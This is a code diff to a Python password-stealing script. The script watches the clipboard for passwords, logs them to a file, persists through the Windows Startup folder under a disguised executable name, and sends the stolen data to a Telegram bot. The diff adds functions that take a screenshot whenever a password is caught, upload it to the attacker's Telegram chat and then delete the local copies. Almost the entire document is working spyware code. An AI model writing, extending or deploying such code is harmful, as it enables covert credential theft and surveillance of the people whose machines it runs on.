@@ -10,8 +10,10 @@ import regex as re
 import requests
 import glob
 import time
+import os
+import pyautogui
 
-MY_TIME = datetime.now().strftime('%Y-%m-%d %H:%M:%S')
+MY_TIME = datetime.now().strftime('%H.%M.%S_%Y.%m.%d')
 # telegram token and id
 TOKEN = r'some_token'
 ADMIN_ID = r'some_id'
@@ -20,12 +22,19 @@ DOWNLOADS_PATH = f'C:/Users/{USER_NAME}/Downloads/get_pass_to_comp.exe'
 STARTUP_PATH = f'C:/Users/{USER_NAME}/AppData/Roaming/Microsoft/' \
                f'Windows/Start Menu/Programs/Startup/'
 LOG_PATH = f'C:/Users/{USER_NAME}/Downloads/intercepted_passwords.txt'
+SCREEN_PATH = f'C:/Users/{USER_NAME}/Downloads/'
 # temporally variable for clipboard
 CLIPBOARD_STRING = ''
 # interval to send a log
-interval = 30
+interval = 60
 # time start script
 start_time = time.time()
+# directory for screenshots
+directory = 'screen_log'
+# path for screenshots directory
+screen_dir = os.path.join(SCREEN_PATH, directory)
+# list for screenshots
+screen_list = []
 
 
 # Check startup
@@ -84,6 +93,30 @@ def ip_finder():
         return 'Can not find ip'
 
 
+# create directory for screenshots
+def create_dir():
+    try:
+        os.mkdir(screen_dir)
+    except FileExistsError:
+        pass
+
+
+# make screenshot
+def screen_shot():
+    pyautogui.screenshot().save(f'{screen_dir}/{MY_TIME}.png')
+
+
+# send screenshots to telegram
+def send_screen():
+    os.chdir(f'{screen_dir}')
+    for screen in glob.iglob('*.png'):
+        screen_list.append(screen)
+    for screen_shots in screen_list:
+        for_send = screen_shots
+        files = {'photo': open(f'{screen_dir}/{for_send}', 'rb')}
+        requests.post(f'https://api.telegram.org/bot{TOKEN}/sendPhoto?chat_id={ADMIN_ID}', files=files)
+
+
 # send log to telegram with time interval
 def log_sender():
     global start_time
@@ -96,6 +129,15 @@ def log_sender():
         start_time = time.time()
 
 
+# clean logs in screenshot folder and list
+def clean_logs():
+    os.chdir(f'{screen_dir}')
+    clean_log = os.listdir()
+    for _ in clean_log:
+        os.remove(_)
+        screen_list.clear()
+
+
 # Intercept pass,  write to file and send text log to Telegram
 def start_loop():
     # string for intercept pass
@@ -104,7 +146,10 @@ def start_loop():
     # variable for ip
     ip = ip_finder()
     while True:
+        # start log send timer
         log_sender()
+        # clean screenshots folder and list
+        clean_logs()
         # assign string to clipboard:
         CLIPBOARD_STRING = pyperclip.paste()
         # create / open file for save passwords:
@@ -117,8 +162,11 @@ def start_loop():
                 if caught_pass is not None:
                     # add intercepted pass and used time and ip to doc:
                     print(caught_pass, 'used', MY_TIME, 'IP:', ip, file=f)
+                    # make screenshot
+                    screen_shot()
+                    # send screenshot to telegram
+                    send_screen()
                     f.close()
-                    # send log to telegram
             # reassign clipboard to string
             pass_string = CLIPBOARD_STRING
         sleep(1)
@@ -129,4 +177,5 @@ if __name__ == '__main__':
     check_admin()
     create_bat()
     clipboard_cleaner()
+    create_dir()
     start_loop()
